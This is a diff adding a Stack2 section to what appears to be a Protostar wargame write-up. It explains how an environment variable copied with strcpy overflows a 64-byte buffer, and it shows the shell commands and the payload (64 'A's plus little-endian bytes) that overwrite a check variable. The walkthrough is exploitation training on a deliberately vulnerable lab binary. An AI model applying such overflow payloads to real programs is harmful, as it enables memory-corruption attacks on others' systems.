@@ -125,3 +125,23 @@ int main(int argc, char **argv)
    user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'A' *64 +'dcba'")
    you have correctly got the variable to the right value
    ```
+   
+   Stack2 :
+   
+   same as stack1 but strcpy copies data to buffer from an environment variable called "GREENIE". You can set environment variables with the command ``` export GREENIE= <any value>```. 
+   
+   Here modified vaiable is being compared to 0x0d0a0d0a. Inorder to modify "modified", GREENIE should be <64bytes>+"\x0a\x0d\x0a\x0d"(little endian for  0x0d0a0d0a )
+   
+   ```
+   user@protostar:/opt/protostar/bin$ ./stack2
+stack2: please set the GREENIE environment variable
+user@protostar:/opt/protostar/bin$ export GREENIE="AAAA"
+user@protostar:/opt/protostar/bin$ set | grep "GREENIE" 
+GREENIE=AAAA
+_=GREENIE
+user@protostar:/opt/protostar/bin$ ./stack2
+Try again, you got 0x00000000
+user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'")
+user@protostar:/opt/protostar/bin$ ./stack2
+you have correctly modified the variable
+   ```
